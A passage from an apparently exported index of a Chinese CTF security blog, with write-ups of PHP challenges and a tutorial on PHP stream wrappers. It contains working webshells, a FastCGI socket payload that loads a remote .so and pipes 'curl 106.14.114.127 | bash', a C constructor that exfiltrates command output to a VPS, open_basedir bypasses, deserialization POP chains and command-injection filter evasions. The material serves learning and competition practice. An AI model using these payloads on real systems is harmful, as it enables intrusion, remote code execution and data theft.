file_get_contents($_GET['readfile']);\n&#125;\n\nreadfile会不经过过滤直接让file_get_content函数去获取，还想用php://input去执行代码，结果不成功，writefile是写文件内容，但是问题在于offset不知道如何去计算，这里我懵逼了，记录一下大佬的payload吧。原理大概是修改/proc/self/mem内存地址信息，来达到getshell做命令执行。\npayload:\nbackend.php?readfile&#x3D;&#x2F;bin&#x2F;bash%20-\nc%20&quot;&#x2F;readflag%20&gt;%20&#x2F;tmp&#x2F;vvvvv&quot;&amp;writefile&#x3D;&#x2F;proc&#x2F;self&#x2F;mem&amp;offset&#x3D;15333784&amp;\nbuffer&#x3D;%90e%F8%F5%FF%7F%00%00&amp;writefile&#x3D;&#x2F;proc&#x2F;self&#x2F;mem&amp;offset&#x3D;15333784&amp;\nbuffer&#x3D;%90e%F8%F5%FF%7F%00%00\n\n\n读取一下被写入tmp/vvvvv的文件。\nNewUpload这里上传文件的套路是\\np\\nh\\np绕过后缀+desktop.ini污染写马。\nï¿½ï¿½\n[.ShellClassInfo]\nLocalizedResourceName&#x3D;@%SystemRoot%\\system32\\shell32.dll,-21770\nIconResource&#x3D;%SystemRoot%\\system32\\imageres.dll,-112\nIconFile&#x3D;%SystemRoot%\\system32\\shell32.dll\nIconIndex&#x3D;-235\nGIF89&lt;?php  @eval($_POST[&#39;1&#39;]);?&gt;\n\n\n然后就上传一个木马进入系统,很可惜蚁剑是用不了，无法连接。重新传一个GET马\n\nsystem()被禁用了，读不了目录,读一下index.php文件：\n&lt;?php\n    ini_set('open_basedir', getcwd());\n    if(isset($_FILES[\"file\"])) &#123;\n        if ($_FILES[\"file\"][\"error\"] > 0)\n        &#123;\n            echo \"错误：: \" . $_FILES[\"file\"][\"error\"] . \"&lt;br>\";\n        &#125;\n        else\n        &#123;\n            echo \"上传文件名: \" . $_FILES[\"file\"][\"name\"] . \"&lt;br>\";\n            echo \"文件类型: \" . $_FILES[\"file\"][\"type\"] . \"&lt;br>\";\n            echo \"文件大小: \" . ($_FILES[\"file\"][\"size\"] / 1024) . \" kB&lt;br>\";\n            echo \"文件临时存储的位置: \" . $_FILES[\"file\"][\"tmp_name\"] . \"&lt;br>\";\n            \n            // 判断当前目录下的 upload 目录是否存在该文件\n            // 如果没有 upload 目录，你需要创建它，upload 目录权限为 777\n            @mkdir(\"upload\");\n            if (file_exists(\"upload/\" . $_FILES[\"file\"][\"name\"]))\n            &#123;\n                echo $_FILES[\"file\"][\"name\"] . \" 文件已经存在。 \";\n            &#125;\n            else\n            &#123;\n                // 如果 upload 目录不存在该文件则将文件上传到 upload 目录下\n                move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\" . $_FILES[\"file\"][\"name\"]);\n                echo \"文件存储在: \" . \"upload/\" . $_FILES[\"file\"][\"name\"];\n            &#125;\n        &#125;\n    &#125;\n    ?>\n\n里面有一个open_basedir，所以就要先去绕过这个限制。\n&lt;?php\nmkdir('suanve');chdir('suanve');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');\nvar_dump(scandir(\"../../../../../../../../../../../../../\".$_GET['dir']));\n\n\n可以看到一个flag文件和一个readflag，常规就是要执行readflag来获取flag。再传一个木马上去。\n&lt;?php\nmkdir('suanve');chdir('suanve');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');\necho file_get_contents($_GET['file']);\n\n发现flag是读取不了的，没有权限，那么就还是要去执行readflag才行\n\n\n\nServer API\nFPM/FastCGI\n\n\n\n\n\n\n\n这是phpinfo里得到的信息。然后去看一下tmp目录下有什么文件。\n\n发现一个php-cgi-74.sock文件，给服务器放一个so文件。\n用c来生成一个.so文件。\n\n#define _GNU_SOURCE\n#include &lt;stdlib.h>\n#include &lt;stdio.h>\n#include &lt;string.h>\n__attribute__ ((__constructor__)) void preload (void)\n&#123;\n    system(\"curl vps:6666/`/readflag`\");\n&#125;\n\n\n\nï¿½ï¿½\n[.ShellClassInfo]\nLocalizedResourceName&#x3D;@%SystemRoot%\\system32\\shell32.dll,-21770\nIconResource&#x3D;%SystemRoot%\\system32\\imageres.dll,-112\nIconFile&#x3D;%SystemRoot%\\system32\\shell32.dll\nIconIndex&#x3D;-235\n&lt;?\n  mkdir(&#39;suanve&#39;);chdir(&#39;suanve&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);\n&#x2F;&#x2F;var_dump(scandir(&quot;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&quot;));\necho copy(&quot;http:&#x2F;&#x2F;vps:9999&#x2F;hpdoger.so&quot;,&quot;&#x2F;tmp&#x2F;sky.so&quot;);\n\n$fp &#x3D; stream_socket_client(&quot;unix:&#x2F;&#x2F;&#x2F;tmp&#x2F;php-cgi-74.sock&quot;, $errno, $errstr,30);$out &#x3D; urldecode(&quot;%01%01%1C%AE%00%08%00%00%00%01%00%00%00%00%00%00%01%04%1C%AE%01%DC%00%00%0E%02CONTENT_LENGTH51%0C%10CONTENT_TYPEapplication&#x2F;text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI&#x2F;1.0%0F%0ESERVER_SOFTWAREphp&#x2F;fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%0B%17SCRIPT_NAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A&#x2F;&#x2F;input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0C%00QUERY_STRING%0F%17PHP_ADMIN_VALUEextension%20%3D%20&#x2F;tmp&#x2F;sky.so%0D%01DOCUMENT_ROOT&#x2F;%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%01%04%1C%AE%00%00%00%00%01%05%1C%AE%003%00%00%3C%3Fphp%20hello_world%28%27curl%20106.14.114.127%20%7C%20bash%27%29%3B%20%3F%3E%01%05%1C%AE%00%00%00%00&quot;);stream_socket_sendto($fp,$out);while (!feof($fp)) &#123;echo htmlspecialchars(fgets($fp, 10)); &#125;fclose($fp);&#x2F;&#x2F;&#39;\n\n\n?&gt;\n\n上传一个读取flag的php文件，并且在vps上打开监听，访问这个上传的文件，就可以在vps上接收到flag。\n这一题而言很好的参考资料也是在别人的WP里看到的https://www.anquanke.com/post/id/186186*#h3-5*\n","slug":"西湖论剑2020复现","date":"2020-10-12T08:15:37.000Z","categories_index":"CTF","tags_index":"CTF,西湖论剑","author_index":"A1andNS"},{"id":"c6ac16b2709d97469cc89f64776332bb","title":"PHP伪协议","content":"file://协议利用条件\nallow_url_fopen:off/on\nallow_url_include:off/on\n\n作用使用file://协议来访问文件系统，在CTF比赛里经常用来读取文件，以此获得flag，并且不受到allow_url_fopen和allow_url_include的影响。\n这里有一点，当PHP里使用include()/require()/include_once()/require_once()参数可控的情况下，如导入一个非.php的文件，依然回按照php语法进行解析，这是include()函数的结果。\n\n\n\n\n\n\n\n\n\nfile://文件系统是PHP使用的默认封装协议，展示了本地文件系统，file://它是使用了相对路径，一般来说脚本目录在什么目录下，其的起始路径就是改目录了。除非特意对默认路径做了修改，使用CLI的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 fopen()和file_get_contents()、include_path会可选地进行搜索，也作为相对的路径。\n例子file://文件的绝对路径和文件名\nhttp:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd\n\n\n文件的相对路径和文件名\nhttp:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;.&#x2F;index.php\n\n\nhttp://文件路径和文件名\nhttp:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;phpinfo.txt\n\nphp://协议利用条件\nallow_url_fopen:off/on\nallow_url_include:on/off\n\n其中仅有php://input、php://stdin、php://memory、php://temp需要on\n作用php://访问各个I/O streams,平时在CTF中经常使用的就是php://input、php://filter,其中用php://filter读取源代码，而php://input用来做php代码执行。\nphp://filter的使用该协议的参数会在该协议的路径上进行传递，多个参数都可以使用。\n\n\n\n常用参数\n说明\n\n\n\nresource=&lt;过滤的数据流&gt;\n这个必须要设置，没有它就过滤不到数据流。\n\n\nread=&lt;读链的过滤器&gt;\n这是一个可选，但是一般还是很经常用到，例如read=convert.base64-encode来base64编码过滤流\n\n\nwrite=&lt;写链的过滤器&gt;\n这也是一个可选，可以设置一个或者多个过滤器名称。\n\n\n&lt;;两个链的过滤器&gt;\n任何没有以read=或这write=作为前缀的过滤器列表会根据实际情况用于read或write\n\n\n下面看看过滤器,种类比较多，记录如下，有些时候忘了可以方面查看：\n\n\n\n字符串过滤器\n说明\n\n\n\nstring.rot13\nrot编码字符\n\n\nstring.toupper\n把所有字符转换成大写\n\n\nstring.tolower\n把所有支付转换成小写\n\n\nstring.strip_tags\n出去字符中的php标签和html标签\n\n\n\n\n\n转换过滤器\n说明\n\n\n\nconvert.base64-encode &amp; convert.base64-decode\n做base64编码和解码\n\n\nconvert.quoted-printable-encode &amp; convert.quoted-printable-decode\nquoted-printable字符和八位二进制编码和解码\n\n\n\n\n\n加密过滤器\n说明\n\n\n\nmcrypt.*\nlibmcript对称加密算法\n\n\nmedecrypt.*\nlibmcrypt对称加密算法\n\n\n\n\n\n压缩过滤器\n说明\n\n\n\nzlib.deflate &amp; zlib.inflate\n在本地文件系统中创建gzip兼容文件的方法，但不产生命令行工具例如gzip的头和尾部信息。只是压缩和解压数据流中有效的负荷部分\n\n\nbzip.compress &amp; bzip2.decompress\n和上面一样，在本地文件系统中创建bz2兼容文件的方法。\n\n\n例子php://filter/read=convert.base64-encode/resource=文件名\n用于读取文件源代码，如果目标对象是一个PHP文件需要对PHP文件去做一个base64编码才行。\nhttp:&#x2F;&#x2F;127.0.0.1&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php\n\nphp://input\n这个也经常使用，当你想要执行你POST传入的php代码就排上用场了。\nhttp:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;php:&#x2F;&#x2F;input\n\n&lt;?php system(&#39;ls&#39;);?&gt;\n\n说到这个，还是burpsuit抓包改包靠谱，最近不知道为什么hackbar它抽风了，post发布出去全变get了。既然可以执行代码，只要权限配合，你可以写马。\n比如这样：\nhttp:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;php:&#x2F;&#x2F;input\n\n&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&#39;; ?&gt;\n\nzip:// &amp; bzip2:// &amp; zlib://协议条件\nallow_url_fopen:off/on\nallow_url_include:off/on\n\n作用zip:// &amp; bzip2:// &amp; zlib://协议都是属于压缩流，可以访问压缩文件中的子文件，而且可以不指定后缀，可以修改为任意后缀。\n例子zip://压缩文件的绝对路径%23压缩文件内的子文件名\n%23是什么就不用说了吧，天天见。\nhttp:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;zip:&#x2F;&#x2F;&#x2F;home&#x2F;a1andns&#x2F;PHP&#x2F;平时测试&#x2F;flag.jpg%23flag.txt\n\n这里的意思是压缩文件flag.txt成flag.zip,压缩包改名为flag.jpg，并且上传。\ncompress.bzip2://file.bz2\n这个是压缩文件为file.bz2并且上传，注意也是绝对路径\ncompress.zlib://file.gz\n压缩文件为file.gz并且上传，注意也是绝对路径\ndata://协议条件\nallow_url_fopen:on\nallow_url_include:on\n\n作用data://数据流封装器是从php5.2.0开始使用的。以此传递相应的格式的数据。经常被用来执行PHP代码。\ndata:&#x2F;&#x2F;text&#x2F;plain,\ndata:&#x2F;&#x2F;text&#x2F;plain;base64,\n\n例子http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo();?&gt;\n\nhttp:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOz8+\n\nhttp:// &amp; https://协议条件\nallow_url_fopen:on\nallow_url_include:on\n\n作用这两个协议大家都很熟了，就是常规的URL格式，允许用过HTTP 1.0的GET方式去访问只读文件或者资源。常用于远程包含。可能导致ssrf的执行。\n例子http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt\nphar://协议phar://协议与zip://协议类似，也可以用来访问zip压缩包内容，但是这个phar没有那么简单，在2018年的black hat大会上，研究人员展示了一种针对PHP的全新攻击手段，phar://协议对象注入技术，这和反序列化又扯上了关系了。这里我觉得可以单独再写一篇博客，结合一些资料学习一下，最近的CTF中也出现了phar://协议结合反序列化去打对象注入的，例如巅峰极客2020的BABYPHP2就是这种类型的。\n","slug":"PHP伪协议","date":"2020-10-09T12:12:55.000Z","categories_index":"学习笔记","tags_index":"网络安全,PHP,协议","author_index":"A1andNS"},{"id":"b6ef90df0d5401009a96a4d7a8cf8b92","title":"西湖论剑之easyjson","content":"[西湖论剑2020] EasyJson考点：代码审计\n&lt;?php\ninclude 'security.php';\n\nif(!isset($_GET['source']))&#123;\n    show_source(__FILE__);\n    die();\n&#125;\n$sandbox = 'sandbox/'.sha1($_SERVER['HTTP_X_FORWARDED_FOR']).'/';\nif(!file_exists($sandbox))&#123;\n    mkdir($sandbox);\n    file_put_contents($sandbox.\"index.php\",\"&lt;?php echo 'Welcome To Dbapp OSS.';?>\");\n&#125;\n$action = $_GET['action'];\n$content = file_get_contents(\"php://input\");\n\n\nif($action == \"write\" &amp;&amp;  SecurityCheck('filename',$_GET['filename']) &amp;&amp;SecurityCheck('content',$content))&#123;\n    //action要是write，但是还要满足securitycheck对filename和content的检查\n    $content = json_decode($content);\n    $filename = $_GET['filename'];\n    $filecontent = $content->content;\n    $filename = $sandbox.$filename;\n    file_put_contents($filename,$filecontent.\"\\n Powered By Dbapp OSS.\");\n&#125;\nelseif($action == \"reset\")&#123; //重置删除index.php之外的文件\n    $files = scandir($sandbox);\n    foreach($files as $file) &#123;\n        if(!is_dir($file))&#123;\n            if($file !== \"index.php\")&#123;\n                unlink($sandbox.$file);\n            &#125;\n        &#125;\n    &#125;\n&#125;\nelse&#123;\n    die('Security Check Failed.');\n&#125;\n\n问题是security_check()是什么东西，但是我也读不到security.php文件。\n看几个关键点，一个是sanbox命名规则：\n$sandbox = 'sandbox/'.sha1($_SERVER['HTTP_X_FORWARDED_FOR']).'/';\nif(!file_exists($sandbox))&#123;\n    mkdir($sandbox);\n    file_put_contents($sandbox.\"index.php\",\"&lt;?php echo 'Welcome To Dbapp OSS.';?>\");\n&#125;\n\n这里是利用你的ip做一个sha1然后得到类似sandbox/xxxxxx/，并且会做初始化，创建index.php，写一个欢迎，这里sanbox一开始不会显示，后来主办方调整了一下。\n$action = $_GET['action'];\n$content = file_get_contents(\"php://input\");\n\n这里我们的action是要设置为write，这个后面的if里可以看出来，然后就是file_get_contents()这个点了，里面直接就是php伪协议输入流，所以我们可以post数据进去，然后这个数据会赋给content变量。安全校验函数不知道是什么，先看看如果满足if可以干什么。有两个细节，json_decode()，所以我们传入的数据应该是一个json的。另一个细节在$filecontent = $content-&gt;content;，这里看来传入的json应该是个json对象，conten属性就是才是内容，而它会被写入filename。那么开干：\n先去搞个sanbox：\nstring(49) &quot;sandbox&#x2F;61b05016f4bc59750b1a38363d4d9a0a51604eda&#x2F;&quot;\n\n然后试试写点东西,这里source不设置的话，没法看回显了。\nhttp:&#x2F;&#x2F;easyjson.d5116a.challenge.gcsis.cn&#x2F;?source&#x3D;0&amp;aciton&#x3D;write&amp;filename&#x3D;f.php\n\n这里有个坑点filename不能数字开头,一开始就是用1.php，搞了半天一直安全检查过不了。\npost数据：\n&#123; &quot;\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074&quot;:&quot;&lt;?\\u0070\\u0068\\u0070 \\u0070\\u0068\\u0070info();?&gt;&quot; &#125;\n\ncontent出现就过不了，php也是一样，所以使用unicode编码来绕过。可以看到根目录是/var/www/html/,传个木马：\n&#123; &quot;\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074&quot;:&quot;&lt;?\\u0070\\u0068\\u0070 eval($_POST[&#39;cmd&#39;]);?&gt;&quot; &#125;\n\n\n/目录下运行readflag，拿到flag\n\n看一看security.php里面到底写了什么东西：\n&lt;?php\n/**\n * Created by PhpStorm.\n * User: meizj\n * Date: 2020/2/7\n * Time: 1:31 PM\n */\n\nfunction SecurityCheck($type,$content)&#123;\n    switch ($type)&#123;\n        case 'filename':\n            if(preg_match(\"/[^a-z\\.]/\", $content) !== 0) &#123;\n                return false;\n            &#125;\n            return true;\n            break;\n        case 'content':\n            if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file') || stristr($content,'php')  || stristr($content,'.')) &#123;\n                return false;\n            &#125;\n            return true;\n            break;\n    &#125;\n&#125;\n","slug":"西湖论剑之easyjson","date":"2020-10-09T11:41:27.000Z","categories_index":"CTF","tags_index":"CTF,西湖论剑","author_index":"A1andNS"},{"id":"e65725db6806e965008ebeaa6f55ead7","title":"BUU刷题记录(2020-10-5-12)","content":"0x01 [极客大挑战 2019]PHP考点：PHP反序列化\n上来就是一只喵，提示备份文件,试一试常见的备份格式，www.zip文件下载到本地。\n\n解压后就这几个文件，其中index.php、flag.php、class.php才是重点，看一下都写了什么东西。\nindex.php：\n&lt;?php\n    include 'class.php';\n    $select = $_GET['select'];\n    $res=unserialize(@$select);\n    ?>\n\nindex.php有一个传参点select，并且可以看到有一个反序列化，所以这里应该是考察反序列化。下面看一下class.php文件，它包含了flag.php文件，看看与flag有关的关键点。\nfunction __destruct()&#123;\n        if ($this->password != 100) &#123;\n            echo \"&lt;/br>NO!!!hacker!!!&lt;/br>\";\n            echo \"You name is: \";\n            echo $this->username;echo \"&lt;/br>\";\n            echo \"You password is: \";\n            echo $this->password;echo \"&lt;/br>\";\n            die();\n        &#125;\n        if ($this->username === 'admin') &#123;\n            global $flag;\n            echo $flag;\n        &#125;else&#123;\n            echo \"&lt;/br>hello my friend~~&lt;/br>sorry i can't give you the flag!\";\n            die();\n\n            \n        &#125;\n\n关键在析构函数，这里我们可以知道password的值必须要是100,username的值必须是admin，才能拿到flag。但是需要注意的点是这个Name类中有一个__wakeup()函数，这个会在反序列化前预加载数据，把username从admin重置为guest,不过这可以用修改序列化字符串里属性个数来绕过问题不大。\nexp:\n&lt;?php\nclass Name\n&#123;\n    private $username = 'admin';\n    private $password = '100';\n&#125;\n\n$name = new Name();\n$select = urlencode(serialize($name));\nvar_dump($select);\n?>\n\npayload:\nO%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D\n\n\n0x02 [ACTF2020 新生赛]Exec考点：命令执行\n这题一开始的界面就是一个命令执行，直接开始试试。直接可以执行命令，用;来间隔命令。\npayload\n127.0.0.1;cat ..&#x2F;..&#x2F;..&#x2F;flag\n\n\n0x03 [MRCTF2020]Ezpop考点：PHP反序列化\n访问环境，直接给出来index.php的源代码：\n&lt;?php\n//flag is in flag.php\n//WTF IS THIS?\n//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95\n//And Crack It!\nclass Modifier &#123;\n    protected  $var;\n    public function append($value)&#123;\n        include($value);\n    &#125;\n    public function __invoke()&#123;\n        $this->append($this->var);\n    &#125;\n&#125;\n\nclass Show&#123;\n    public $source;\n    public $str;\n    public function __construct($file='index.php')&#123;\n        $this->source = $file;\n        echo 'Welcome to '.$this->source.\"&lt;br>\";\n    &#125;\n    public function __toString()&#123;\n        return $this->str->source;\n    &#125;\n\n    public function __wakeup()&#123;\n        if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this->source)) &#123;\n            echo \"hacker\";\n            $this->source = \"index.php\";\n        &#125;\n    &#125;\n&#125;\n\nclass Test&#123;\n    public $p;\n    public function __construct()&#123;\n        $this->p = array();\n    &#125;\n\n    public function __get($key)&#123;\n        $function = $this->p;\n        return $function();\n    &#125;\n&#125;\n\nif(isset($_GET['pop']))&#123;\n    @unserialize($_GET['pop']);\n&#125;\nelse&#123;\n    $a=new Show;\n    highlight_file(__FILE__);\n&#125;\n\n这里看一下大概有3个类Modifier类、Show类、Test类，关键结尾处的\nif(isset($_GET['pop']))&#123;\n    @unserialize($_GET['pop']);\n&#125;\nelse&#123;\n    $a=new Show;\n    highlight_file(__FILE__);\n&#125;\n\n这里看到了一个传入参数pop，并且php会对传入的pop参数进行unserialize操作。如果没有传入pop参数就会新建一个Show类，并且显示代码。接着看看show类，里面有两个属性，一个是source，一个是str，使用了3个魔术方法。这里重点关注一下__toString()、__wakeup()方法。这里的wakeup方法，做了一个正则匹配source的内容，并且重置source为index.php，所以如果source是对象就会调用toString方法，然后关注toString方法，这里return了一个$this-&gt;str-&gt;source，所以我们可以构造str为一个对象。再看Test类的魔术方法是__get()，那么就要一个Test类对象调用一个不可访问的属性，这就和Show类的toString方法里的返回值联动起来了，只要把str定义为Test类对象,就可以触发get方法。在get方法里面有一个返回值，把p属性作为函数执行。这也许是一个利用点，看看Modifier类里面的__invoke方法，当Modifier类对象被当做函数执行是会触发，执行文件包含操作，所以要触发这个文件可以在Test类里把p属性定义为Modifier类对象。\nPOP链：\n__wakeup-&gt;__toString-&gt;__get-&gt;__invoke\n\nexp:\n&lt;?php\nclass Modifier\n&#123;\n    protected $var = \"php://filter/read=convert.base64-encode/resource=flag.php\";\n&#125;\n\nclass Show\n&#123;\n    public $source;\n    public $str;\n    public function __construct()&#123;\n        $this->str = new Test();\n    &#125;\n&#125;\n\nclass Test\n&#123;\n    public $p;\n\n    public function __construct()\n    &#123;\n        $this->p = new Modifier();\n    &#125;\n&#125;\n$a = new Show();\n$b = new Show();\n$a->source = $b;\n$a->str=\"\";\n$payload = urlencode(serialize($a));\nvar_dump($payload);\n\n?>\n\n这里有两个Show类对象要注意，一个是一开始的Show对象，一个是用来触发__toString方法的show对象，然后要注意由于这里触发toString方法的是$b，所以pop链子的下一个Test对象应该是在$b-&gt;str里，而$a-&gt;str这是要设置为””\n\n解码base64：\n&lt;?php\nclass Flag&#123;\n    private $flag= \"flag&#123;7db1c9c5-6b6d-43cd-81c8-51e6a7413d12&#125;\";\n&#125;\necho \"Help Me Find FLAG!\";\n?>\n\n就可以得到flag\n0x04 [GXYCTF2019]Ping Ping Ping考点：命令执行、外联执行、变量拼接\n上来就是?ping=,直接试试，可以看到目录，但是cat不了文件，会回复一个fxck your space!，看来输入是被处理了。看来是不能存在空格,还对一些符号做了过滤，例如*、’’等\n$IFS\n$&#123;IFS&#125;\n$IFS$1 \n&lt; \n&lt;&gt; \n&#123;cat,flag.php&#125;\n%20 \n%09 \n\n绕过过滤空格，不过很多种方式都失败了。用cat$IFS$1flag.php，回了一个fxck your flag! ，应该是还有什么限制，看看index.php能不能读出来,读出来后index.php\n/?ip=\n|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/\", $ip, $match))&#123;\n    echo preg_match(\"/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;20&#125;]|\\>|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/\", $ip, $match);\n    die(\"fxck your symbol!\");\n  &#125; else if(preg_match(\"/ /\", $ip))&#123;\n    die(\"fxck your space!\");\n  &#125; else if(preg_match(\"/bash/\", $ip))&#123;\n    die(\"fxck your bash!\");\n  &#125; else if(preg_match(\"/.*f.*l.*a.*g.*/\", $ip))&#123;\n    die(\"fxck your flag!\");\n  &#125;\n  $a = shell_exec(\"ping -c 4 \".$ip);\n  echo \"\n\";\n  print_r($a);\n&#125;\n\n?>\n\n好家伙，过滤的挺多的,难怪刚才很多绕过方式都无法使用了，这里不能直接出现flag，可以使用变量拼接来解决：\n变量拼接：\nip&#x3D;127.0.0.1;a&#x3D;g;b&#x3D;a;c&#x3D;l;d&#x3D;f;cat$IFS$1$d$c$b$a.php\n\n\n其他方法：\nip&#x3D;127.0.0.1;cat$IFS$1&#96;ls&#96;\n\n这种方法相当高级，使用了外联方法，也就是使用`符号把命令ls的输出作为cat的输入。给大佬跪下了。\nbash虽然被禁用了，但是还有一个sh可以使用，sh是linux中运行shell的命令，bash相当于sh的升级版，我也试了一下dash能不能使用，但是不能使用dash，这可能是系统内核版本的原因。\nip&#x3D;127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh\n\n查看了一下系统信息，靶机是Alpine Linux系统。\n\n\n\n\n\n\n\n\n\ndash是的debian上的一个shell，为了得到更快的速度debian已经把/bin/sh–&gt;dash了。我的Deepin系统也是如此。\n\n震惊了，居然就没有bash，所以就算他不过滤了bash也是用不了的。\nlrwxrwxrwx    1 root     root            12 Jan 30  2019 &#x2F;bin&#x2F;sh -&gt; &#x2F;bin&#x2F;busybox\n\n指向了busybox，BusyBox 是一个集成了三百多个最常用Linux命令和工具的软件。BusyBox 包含了一些简单的工具，例如ls、cat和echo等等，还包含了一些更大、更复杂的工具，例grep、find、mount以及telnet。\n由于Alpine Linux还有一个ash的shell，所以不用sh而用ash也是可以的。\n0x05 [护网杯 2018]easy_tornado考点：SSTI\n上来给三个文件，flag.txt、welcome.txt、hints.txt，下面看一下\nhints.txt给出的信息是md5(cookie_secret+md5(filename)),同时观察到了，url处的filehash参数，应该就是来源于此算法。welcome.php里面只有render，flag.txt告诉我flag in /fllllllllllllag。\n如果不提交filehash是会报错的,关键在于如何得到cookie_secret这个东西，cookie里完全没有这个东西，没有眉目。注意到error界面的url处，传入了一个参数msg，看看这个点能不能利用。经过测试发现我们传入的msg会被输出，所以看看有没有可能可以ssti。\n试了一下49，回显了一个ORZ,这里题目说是tornado,就去百度学习一下。\n\n\n\n\n\n\n\n\n\nTornado龙卷风是一个开源的网络服务器框架，它是基于社交聚合网站FriendFeed的实时信息服务开发而来的。2007年由4名Google前软件工程师一起创办了FriendFeed，旨在使用户能够方便地跟踪好友在Facebook和Twitter等多个社交网站上的活动。结果两年后，Facebook宣布收购FriendFeed，交易价格约为5000万美元。而此时FriendFeed只有12名员工。据说这帮人后来又到了Google，搞出了现在的Google App Engine…\n具体可以查看这里https://www.jianshu.com/p/3a928ade93dc\n了解到有一个handler.settings可以读取环境变量\n&#123;'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '5465bf2d-a931-4c50-9001-5e848516c6be'&#125;\n\n所以就可以拿到一个cookie_secret。下面就可以去构造了：\nfilehash:\n955928fcfdde832100b612bda4304491\n\n\n关键还是在于对tornado的ssti，获取到secret_cookie。\n0x06 [ACTF2020 新生赛]Include考点：文件包含\n进去给一个跳转到?file=flag.php页面，可以发现吧flag.php通过file参数传入。考虑到考察文件包含，当然结合题目也应该猜到了。跳转到的界面说Can you find out the flag。直接php伪协议上去试一下。\npayload:\n?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php\n\n得到base64回显,解码base64：\n&lt;?php\necho \"Can you find out the flag?\";\n//flag&#123;179d5027-72c8-41ea-b06a-7bdd3df41ad8&#125;\n\n\nindex.php:\n&lt;meta charset&#x3D;&quot;utf8&quot;&gt;\n&lt;?php\nerror_reporting(0);\n$file &#x3D; $_GET[&quot;file&quot;];\nif(stristr($file,&quot;php:&#x2F;&#x2F;input&quot;) || stristr($file,&quot;zip:&#x2F;&#x2F;&quot;) || stristr($file,&quot;phar:&#x2F;&#x2F;&quot;) || stristr($file,&quot;data:&quot;))&#123;\n\texit(&#39;hacker!&#39;);\n&#125;\nif($file)&#123;\n\tinclude($file);\n&#125;else&#123;\n\techo &#39;&lt;a href&#x3D;&quot;?file&#x3D;flag.php&quot;&gt;tips&lt;&#x2F;a&gt;&#39;;\n&#125;\n?&gt;\n\n\n可以看到其实有过滤，不过太巧了，我直接就php://filter了。\n","slug":"BUU刷题记录-2020-10-5-12","date":"2020-10-05T13:08:44.000Z","categories_index":"CTF","tags_index":"CTF,BUUOJ","author_index":"A1andNS"},{"id":"586afb52f643078e9cf305f6eadf9480","title":"BUUOJ刷题(2020-20-04)","content":"0x01 [SUCTF 